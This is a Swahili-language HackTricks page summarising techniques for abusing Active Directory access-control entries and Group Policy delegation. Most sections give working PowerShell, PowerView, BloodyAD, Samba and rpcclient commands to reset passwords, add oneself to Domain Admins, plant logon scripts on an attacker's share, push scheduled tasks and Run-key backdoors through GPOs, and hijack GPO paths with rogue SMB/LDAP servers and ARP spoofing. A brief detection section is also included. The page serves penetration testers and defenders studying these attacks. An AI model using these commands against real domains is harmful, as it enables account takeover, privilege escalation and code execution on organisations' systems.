# Matumizi Mabaya ya ACL/ACE za Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ukurasa huu ni muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, soma makala asili.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Haki za GenericAll kwa Mtumiaji**

Ruhusa hii humpa mshambulizi udhibiti kamili wa akaunti ya mtumiaji lengwa. Baada ya kuthibitisha haki za `GenericAll` kwa kutumia amri ya `Get-ObjectAcl`, mshambulizi anaweza:

- **Kubadilisha Nenosiri la Mtumiaji Lengwa**: Kwa kutumia `net user <username> <password> /domain`, mshambulizi anaweza kuweka upya nenosiri la mtumiaji.
- Ukiwa kwenye Linux, unaweza kufanya vivyo hivyo kupitia SAMR kwa kutumia Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Ikiwa akaunti imezimwa, ondoa alama ya UAC**: `GenericAll` inaruhusu kuhariri `userAccountControl`. Kutoka Linux, BloodyAD inaweza kuondoa alama ya `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Weka SPN kwenye akaunti ya mtumiaji ili iwe kerberoastable, kisha tumia Rubeus na targetedKerberoast.py kutoa hashes za ticket-granting ticket (TGT) na kujaribu kuzivunja.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **ASREPRoasting inayolengwa**: Zima pre-authentication kwa mtumiaji, na kufanya akaunti yake iwe hatarini kwa ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Ukiwa na `GenericAll` kwa mtumiaji, unaweza kuongeza credential inayotegemea certificate na kujitambulisha kama mtumiaji huyo bila kubadilisha password yake. Tazama:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Haki za GenericAll kwenye Kundi**

Upendeleo huu humwezesha mshambuliaji kubadilisha uanachama wa kundi ikiwa ana haki za `GenericAll` kwenye kundi kama `Domain Admins`. Baada ya kutambua distinguished name ya kundi kwa kutumia `Get-NetGroup`, mshambuliaji anaweza:

- **Kujiongeza kwenye Kundi la Domain Admins**: Hili linaweza kufanywa kwa kutumia amri za moja kwa moja au modules kama Active Directory au PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Kutoka Linux, unaweza pia kutumia BloodyAD kujiongeza kwenye vikundi vyovyote pale unapokuwa na ruhusa ya GenericAll/Write ya kudhibiti uanachama wake. Ikiwa kikundi lengwa kimejumuishwa ndani ya “Remote Management Users”, utapata mara moja ufikiaji wa WinRM kwenye host zinazotambua kikundi hicho:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Kuwa na ruhusa hizi kwenye object ya kompyuta au akaunti ya mtumiaji kunaruhusu:

- **Kerberos Resource-based Constrained Delegation**: Huwezesha kuchukua udhibiti wa object ya kompyuta.
- **Shadow Credentials**: Tumia mbinu hii kuiga akaunti ya kompyuta au mtumiaji kwa kutumia vibaya ruhusa za kuunda shadow credentials.

## **WriteProperty on Group**

Ikiwa mtumiaji ana haki za `WriteProperty` kwenye objects zote za kundi maalum (kwa mfano, `Domain Admins`), anaweza:

- **Kujiongeza kwenye Kundi la Domain Admins**: Inawezekana kwa kuchanganya amri za `net user` na `Add-NetGroupUser`; mbinu hii huwezesha kupandisha kiwango cha ruhusa ndani ya domain.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Kujiongeza Mwenyewe (Self-Membership) kwenye Group**

Ruhusa hii huwawezesha washambuliaji kujiongeza kwenye groups maalum, kama vile `Domain Admins`, kwa kutumia commands zinazobadilisha uanachama wa group moja kwa moja. Kutumia mfuatano ufuatao wa commands huwezesha kujiongeza mwenyewe:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Ruhusa inayofanana na hii huwawezesha washambuliaji kujiongeza moja kwa moja kwenye vikundi kwa kurekebisha sifa za vikundi hivyo ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitishaji na utekelezaji wa ruhusa hii hufanywa kwa kutumia:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Kuwa na `ExtendedRight` kwa mtumiaji ya `User-Force-Change-Password` huruhusu kuweka upya nenosiri bila kujua nenosiri la sasa. Haki hii inaweza kuthibitishwa na kutumiwa kupitia PowerShell au zana mbadala za mstari wa amri. Kuna njia kadhaa za kuweka upya nenosiri la mtumiaji, zikiwemo vipindi shirikishi na amri za mstari mmoja kwa mazingira yasiyo shirikishi. Amri hizo ni kuanzia miito rahisi ya PowerShell hadi kutumia `rpcclient` kwenye Linux, zikionyesha utofauti wa njia za mashambulizi.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner kwenye Group**

Ikiwa mshambuliaji atagundua kuwa ana haki za `WriteOwner` kwenye kikundi, anaweza kubadilisha umiliki wa kikundi hicho uwe wake. Hili lina athari kubwa hasa ikiwa kikundi husika ni `Domain Admins`, kwani kubadilisha umiliki huruhusu udhibiti mpana zaidi wa sifa na wanachama wa kikundi. Mchakato huu unahusisha kutambua object sahihi kwa kutumia `Get-ObjectAcl`, kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki kwa kutumia SID au jina.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite kwa Mtumiaji**

Ruhusa hii humwezesha mshambuliaji kurekebisha sifa za mtumiaji. Hasa, akiwa na ufikiaji wa `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya hati ya kuingia ya mtumiaji ili kutekeleza hati hasidi mtumiaji anapoingia. Hili hufanywa kwa kutumia amri ya `Set-ADObject` kusasisha sifa ya `scriptpath` ya mtumiaji lengwa ili ielekeze kwenye hati ya mshambuliaji.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

ACE nyembamba zaidi ya `WriteProperty`, iliyowekewa mipaka kwa attribute ya [`scriptPath` ya mtumiaji](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), inaweza kutosha; `GenericWrite` haihitajiki. Unganisha ruhusa hiyo ya attribute na script inayoweza kuandikwa chini ya mti wa `SYSVOL\<domain>\scripts` au `NETLOGON` wa domain, kisha tathmini kama mtumiaji lengwa huenda akaingia na kufikia script. Script huendeshwa katika muktadha wa mtumiaji huyo anapoingia. Kagua ACL za AD na za faili/share zinazotumika kando; Allow ACE inayolingana au directory inayoweza kuandikwa pekee haithibitishi kuwa njia nzima imekamilika.

## **GenericWrite kwenye Group**

Kwa privilege hii, attackers wanaweza kudhibiti uanachama wa group, kwa mfano kwa kujiongeza wenyewe au watumiaji wengine kwenye group maalum. Mchakato huu unahusisha kuunda credential object, kuitumia kuongeza au kuondoa watumiaji kwenye group, na kuthibitisha mabadiliko ya uanachama kwa kutumia amri za PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Kutoka Linux, Samba `net` inaweza kuongeza/kuondoa wanachama unapokuwa na `GenericWrite` kwenye kundi (inafaa wakati PowerShell/RSAT hazipatikani):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Kumiliki object ya AD na kuwa na ruhusa za `WriteDACL` juu yake humwezesha mshambulizi kujipa mwenyewe ruhusa za `GenericAll` juu ya object hiyo. Hili hutekelezwa kupitia udanganyifu wa ADSI, unaowezesha udhibiti kamili wa object hiyo na uwezo wa kurekebisha uanachama wake wa vikundi. Hata hivyo, kuna vikwazo unapojaribu kutumia vibaya ruhusa hizi kwa kutumia cmdlets za `Set-Acl` / `Get-Acl` za moduli ya Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Uchukuaji wa haraka wa udhibiti kwa WriteDACL/WriteOwner (PowerView)

Unapokuwa na `WriteOwner` na `WriteDacl` kwa mtumiaji au akaunti ya huduma, unaweza kupata udhibiti kamili na kuweka upya nenosiri lake kwa kutumia PowerView bila kujua nenosiri la zamani:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Vidokezo:
- Huenda ukahitaji kwanza kubadilisha mmiliki awe wewe mwenyewe ikiwa una `WriteOwner` pekee:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Thibitisha ufikiaji kwa kutumia itifaki yoyote (SMB/LDAP/RDP/WinRM) baada ya kuweka upya nenosiri.

## **Replication on the Domain (DCSync)**

Shambulio la DCSync hutumia ruhusa mahususi za replication kwenye domain ili kuiga Domain Controller na kusawazisha data, ikijumuisha credentials za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama `DS-Replication-Get-Changes`, ambazo huruhusu washambuliaji kutoa taarifa nyeti kutoka kwenye mazingira ya AD bila ufikiaji wa moja kwa moja wa Domain Controller.<sup>[[5]](#references)</sup> [**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Ufikiaji uliokasimiwa wa kusimamia Group Policy Objects (GPOs) unaweza kuleta hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama `offense\spotless` amekasimiwa haki za kusimamia GPO, anaweza kuwa na ruhusa kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumiwa vibaya kwa madhumuni hasidi, kama ilivyotambuliwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Ili kutambua GPO zilizosanidiwa vibaya, cmdlets za PowerSploit zinaweza kuunganishwa. Hii huruhusu kugundua GPO ambazo mtumiaji mahususi ana ruhusa za kuzisimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Kompyuta Ambazo Sera Fulani Inatumika Kwazo**: Inawezekana kubaini kompyuta ambazo GPO mahususi inatumika kwao, ili kusaidia kuelewa wigo wa athari zinazoweza kutokea. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Sera Zinazotumika kwa Kompyuta Fulani**: Ili kuona sera zinazotumika kwa kompyuta mahususi, amri kama `Get-DomainGPO` zinaweza kutumika.

**OUs Ambazo Sera Fulani Inatumika Kwazo**: Kutambua organizational units (OUs) zinazoathiriwa na sera fulani kunaweza kufanywa kwa kutumia `Get-DomainOU`.

Unaweza pia kutumia zana ya [**GPOHound**](https://github.com/cogiceo/GPOHound) kuorodhesha GPO na kupata matatizo ndani yake.

### Abuse GPO - New-GPOImmediateTask

GPO zilizosanidiwa vibaya zinaweza kutumiwa kutekeleza code, kwa mfano, kwa kuunda kazi iliyoratibiwa inayotekelezwa mara moja. Hili linaweza kufanywa ili kuongeza mtumiaji kwenye kundi la wasimamizi wa ndani kwenye mashine zilizoathiriwa, na hivyo kuongeza kwa kiasi kikubwa viwango vya ruhusa:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

Moduli ya GroupPolicy, ikiwa imesakinishwa, huruhusu kuunda na kuunganisha GPO mpya, na kuweka mapendeleo kama vile thamani za registry ili kutekeleza backdoors kwenye kompyuta zilizoathiriwa. Mbinu hii inahitaji GPO isasishwe na mtumiaji aingie kwenye kompyuta ili utekelezaji ufanyike:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Kutumia vibaya GPO

SharpGPOAbuse inatoa njia ya kutumia vibaya GPO zilizopo kwa kuongeza kazi au kurekebisha mipangilio bila kuhitaji kuunda GPO mpya. Zana hii inahitaji kurekebisha GPO zilizopo au kutumia zana za RSAT kuunda mpya kabla ya kutumia mabadiliko:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Kulazimisha Usasishaji wa Sera

Usasishaji wa GPO kwa kawaida hufanyika takribani kila baada ya dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri ya `gpupdate /force` inaweza kutumika kwenye kompyuta lengwa ili kulazimisha usasishaji wa sera mara moja. Amri hii huhakikisha kuwa marekebisho yoyote ya GPO yanatumika bila kusubiri mzunguko unaofuata wa usasishaji otomatiki.

### Kwa Ndani

Ukikagua Scheduled Tasks za GPO fulani, kama `Misconfigured Policy`, unaweza kuthibitisha kuwa kazi kama `evilTask` zimeongezwa. Kazi hizi huundwa kupitia scripts au zana za mstari wa amri zinazolenga kubadilisha tabia ya mfumo au kuongeza mamlaka.

Muundo wa kazi hiyo, kama unavyoonyeshwa kwenye faili ya usanidi wa XML inayozalishwa na `New-GPOImmediateTask`, unaeleza maelezo ya kazi iliyopangwa—ikiwemo amri itakayotekelezwa na vichochezi vyake. Faili hii inaonyesha jinsi kazi zilizopangwa zinavyofafanuliwa na kusimamiwa ndani ya GPO, na kutoa njia ya kutekeleza amri au scripts za kiholela kama sehemu ya utekelezaji wa sera.

### Watumiaji na Vikundi

GPO pia huruhusu kubadilisha uanachama wa watumiaji na vikundi kwenye mifumo lengwa. Kwa kuhariri faili za sera za Users and Groups moja kwa moja, washambuliaji wanaweza kuongeza watumiaji kwenye vikundi vyenye mamlaka ya juu, kama kikundi cha ndani cha `administrators`. Hili linawezekana kupitia ugawaji wa ruhusa za kusimamia GPO, unaoruhusu kurekebisha faili za sera ili kujumuisha watumiaji wapya au kubadilisha uanachama wa vikundi.

Faili ya usanidi wa XML ya Users and Groups inaeleza jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza maingizo kwenye faili hii, watumiaji mahususi wanaweza kupewa mamlaka ya juu kwenye mifumo iliyoathiriwa. Njia hii hutoa mbinu ya moja kwa moja ya kuongeza mamlaka kupitia udanganyifu wa GPO.

Kwa mipangilio ya usalama kama vile uanachama wa vikundi vya ndani na haki za watumiaji, kagua pia template ya GPO iliyotumika kwenye `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` na ACL ya saraka ya `SecEdit`. Saraka au faili inayoweza kuandikwa ni kidokezo cha kuchunguza: ruhusa halisi za ufikiaji wa share ya SYSVOL, ACL za deny na inherited, ruhusa za Group Policy container, wigo wa sera, na uonyeshaji upya wa mteja vyote huamua kama mabadiliko yanaweza kuanza kutumika. Uanachama katika kikundi kinachoitwa “GPO Managers” pekee hauthibitishi kuwa na haki za kuhariri. [Microsoft inaeleza njia hii ya template na mgawanyo kati ya Group Policy container na template.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Zaidi ya hayo, mbinu nyingine za kutekeleza code au kudumisha persistence zinaweza kuzingatiwa, kama kutumia logon/logoff scripts, kurekebisha registry keys za autoruns, kusakinisha programu kupitia faili za .msi, au kuhariri usanidi wa services. Mbinu hizi hutoa njia mbalimbali za kudumisha ufikiaji na kudhibiti mifumo lengwa kwa kutumia vibaya GPO.

### Kuelekeza upya upatikanaji wa GPC/GPT kwenye huduma ghushi zinazothibitisha utambulisho

GPO ina **Group Policy Container (GPC)** ya LDAP yenye metadata na **Group Policy Template (GPT)** inayohifadhiwa kwenye SMB pamoja na faili za sera. Wakati wa uonyeshaji upya, mteja hufuata `gPLink` ya container, husoma GPC inayorejelewa pamoja na `gPCFileSysPath` yake, kisha hupakua GPT kutoka kwenye njia hiyo ya UNC. Kwa hiyo, ufikiaji wa kuandika kwenye GPC yenyewe au `gPLink` ya OU, Site au Domain unaweza kutumiwa kusababisha uchakataji wa sera wenye mamlaka ya juu.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Kuweka sumu kwenye `gPCFileSysPath` kwa kutumia GPOddity

Ikiwa principal inayodhibitiwa inaweza kuandika kwenye GPC lengwa (moja kwa moja au kupitia **NTLM relay to LDAP**), badilisha `gPCFileSysPath` iwe njia ya UNC inayopangishwa na mshambuliaji. [GPOddity](https://github.com/synacktiv/GPOddity) hujiendesha yenyewe kubadilisha LDAP na kutoa GPT hasidi iliyo na faili za sera zinazotegemea modules au Immediate Task ambayo mteja wa Group Policy hutekeleza kama `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Share ya SMB isiyohitaji utambulisho au isiyojali credentials haitoshi kwa wateja wa sasa wa Windows: SMB Secure Negotiate huhitaji uthibitisho kuwa uthibitishaji wa utambulisho ulifaulu, kwa hiyo huduma ghushi lazima ithibitishe utambulisho wa domain, itoe ufunguo wa kipindi cha SMB, na isaini majibu yake kwa usahihi. Katika hali ya embedded, isanidi GPOddity kwa kutumia akaunti ya mashine inayodhibitiwa pamoja na ufunguo wake wa huduma, kisha uchague payload ya upande wa kompyuta au wa mtumiaji katika sehemu ya `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Kesi ya kipekee ya GPO ya mtumiaji:** baada ya MS16-072, Windows bado huunda sessions mbili za SMB2 ndani ya **muunganisho mmoja wa TCP**: session ya mtumiaji husoma `GPT.INI`, kisha session ya akaunti ya kompyuta husoma usanidi unaotumika, kama vile `ScheduledTasks.xml`. Kwa hiyo, server hasidi lazima ihifadhi hali ya uthibitishaji, session keys na signing keys kwa kutumia SMB2 `SessionId`, si socket pekee. Fork ya Scapy iliyojumuishwa kwenye GPOddity/OUned hutekeleza hili kupitia `SMBStreamSocketMultiplexing` na `SMBServer` inayotambua multiplexing; la sivyo, servers za Impacket/Scapy zinazotumia session moja hutumia tena hali isiyo sahihi ya signing na hushindwa kwenye policies za watumiaji.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning kwa OUned

Kwa `WriteGPLink`, `GenericWrite` au udhibiti sawia juu ya OU, Site au Domain, mshambuliaji anaweza kuongeza link ambayo GPC DN yake hutolewa na LDAP host inayodhibitiwa na mshambuliaji. Uwezo huu uliwasilishwa awali na Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) huweka kiotomatiki uandishi wa LDAP na mnyororo hasidi wa GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Mwathiriwa huanza kwa kuthibitisha utambulisho wake kwenye huduma hasidi ya LDAP na kupokea GPC ambayo `gPCFileSysPath` yake inaelekeza kwenye huduma hasidi ya SMB; kisha huthibitisha utambulisho wake kwenye SMB na kutumia GPT iliyotolewa. Kwa hiyo, OUned anahitaji akaunti yenye SPN ya LDAP, akaunti ya mashine yenye SPN ya HOST kwa SMB (akaunti hiyo hiyo ya mashine inaweza kutimiza mahitaji yote mawili), na utatuzi wa DNS au uelekezaji upya wa trafiki unaotuma porti 389 na 445 kwa mashine ya operator.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned's seva ya LDAP ya Scapy iliyopachikwa huthibitisha Kerberos/SPNEGO kwa kutumia service key halisi inayodhibitiwa, na hutoa data yoyote ya GPC kutoka JSON. Key tupu ya JSON huwakilisha rootDSE, viambishi awali vya `base64:` huwakilisha thamani za binary, na seva hii inasaidia add/delete/modify/search pamoja na utafutaji wa `BASE`, `LEVEL` na `SUBTREE`; inaweza kujadiliana kuhusu kutotumia ulinzi wowote, integrity au confidentiality. Hii hufanya huduma itumike tena pale Windows component nyingine inapofuata rejeleo la LDAP linalodhibitiwa na mshambuliaji lakini ikasisitiza LDAP iliyothibitishwa.<sup>[[15]](#references)</sup>

Usidhani kuwa kusawazisha nenosiri la akaunti kwenye domain dummy kunazalisha upya kila Kerberos key: RC4 hutokana na nenosiri, ilhali AES string-to-key pia hutumia salt inayotokana na hostname/domain ya principal. Kutoa AES key halisi ya akaunti kwa `KerberosSSP` huepusha kulazimisha matumizi ya RC4 kupitia mabadiliko yanayotambulika kwenye `msDS-SupportedEncryptionTypes` ya akaunti ya mashine inayoweza kujiandikia yenyewe.<sup>[[15]](#references)</sup>

#### Mihimili ya ugunduzi

Linganisha mabadiliko kwenye `gPCFileSysPath` au `gPLink` na mabadiliko ya toleo la GPO pamoja na XML mpya za Immediate/Scheduled Task. Chunguza viungo vinavyoelekeza kwenye naming context zisizotarajiwa, UNC host zilizo nje ya seti iliyoidhinishwa ya DC/SYSVOL, rekodi za DNS zinazoelekeza upya majina ya akaunti za mashine, service ticket za LDAP/CIFS za akaunti za mashine zisizo za kawaida, na mabadiliko ya `msDS-SupportedEncryptionTypes` yanayowezesha RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` kwenye OU/domain hukuwezesha kurekebisha attribute ya `gPLink` ya container inayolengwa na **kulazimisha GPO iliyopo itumike** bila kuhariri GPO yenyewe. Hili huwa muhimu pale GPO iliyounganishwa tayari inaporejelea maudhui ya mbali kupitia **UNC paths** (`\\HOST\share\...`), kwa sababu watumiaji waliothibitishwa wanaweza kusoma **SYSVOL** na kutafuta sera zinazoweza kutumiwa tena wakiwa offline.<sup>[[11]](#references)</sup>

Mtiririko wa kazi wa kiwango cha juu:

1. Tumia BloodHound kutambua principal yenye `WriteGPLink` kwenye OU na kuorodhesha kompyuta/watumiaji walio ndani ya OU hiyo.
2. Nakili `SYSVOL` kwa ruhusa ya kusoma pekee na uchanganue GPO ukitafuta **Software Installation**, **drive mappings** (`Drives.xml`), na **logon/startup scripts** zinazorejelea UNC paths.
3. Pendelea sera zinazoelekeza kwenye **hostname ya moja kwa moja** (kwa mfano `\\DC02\share\pkg.msi`) badala ya njia za DFS/domain-namespace, kwa sababu njia zinazotumia hostname ni rahisi zaidi kuelekezwa upya kwa L2 spoofing.
4. Ongeza GUID ya GPO iliyochaguliwa kwenye `gPLink` ya OU inayolengwa ili victim ichakate sera hiyo iliyopo.
5. Kwenye broadcast domain hiyo hiyo, fanya ARP spoofing ya UNC host na uhusishe IP yake hapa ndani (`ip addr add <target_ip>/32 dev <iface>`) ili trafiki ya SMB ya victim ifike kwenye host yako.
6. Toa njia/jina la faili linalotarajiwa kutoka kwenye SMB server ya mshambuliaji (kwa mfano `smbserver.py`) na usubiri uchakataji wa kawaida wa sera.

Mfano wa ukusanyaji wa `SYSVOL` na ulinganishaji wa GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Unganisha GPO iliyopo na OU lengwa:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Ikiwa GPO iliyounganishwa itasambaza MSI kutoka kwenye njia ya UNC, client itaipakua wakati wa **computer startup** na kuisakinisha kama **`NT AUTHORITY\SYSTEM`**. Kwa spoofing host iliyorejelewa na kutoa MSI hasidi chini ya **share/path/name** ileile, unaweza kubadilisha `WriteGPLink` kuwa utekelezaji wa code kama SYSTEM **bila kurekebisha SYSVOL**.

Vikwazo muhimu:

- **Muda ni muhimu**: link mpya huonekana wakati wa policy refresh (mara nyingi baada ya ~90 minutes), lakini **Software Installation** kwa kawaida huanzishwa wakati wa **reboot**.
- Windows Installer kwa kawaida hufuatilia usambazaji kwa kutumia **`ProductCode`** ya package. Ikiwa product tayari imesakinishwa, usambazaji unaweza kurukwa.
- Ili kuepuka MSI kukataliwa, rekebisha MSI rogue ili **`ProductCode`** na **`PackageCode`** zake zilingane na za package halali inayotarajiwa na GPO.
- Faili za zamani za matangazo za `.aas` zinaweza kubaki kwenye `SYSVOL`, kwa hivyo thibitisha kuwa usambazaji bado unaonekana kuwa active kabla ya kutegemea njia hii.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` husababisha watumiaji kuthibitisha utambulisho kwa kutumia UNC path iliyosanidiwa wakati wa kuingia au kuunganisha tena. Ukifanya spoof ya host iliyorejelewa, unaweza kunasa **NetNTLMv2**. SMB ikifanywa ishindwe kimakusudi, Windows inaweza kujaribu tena kupitia **WebDAV**, na kutuma **NTLM over HTTP**, ambayo ni rahisi zaidi kutumia kwa relays kuelekea **LDAP(S)**, **AD CS**, au **SMB**.

#### Logon/startup script UNC hijack

Mbinu hiyo hiyo inatumika kwa scripts zinazopangishwa kwenye UNC na kupatikana katika `SYSVOL`:

- **Logon scripts** kwa kawaida hutekelezwa katika muktadha wa **user**.
- **Startup scripts** kwa kawaida hutekelezwa katika muktadha wa **computer / SYSTEM**.

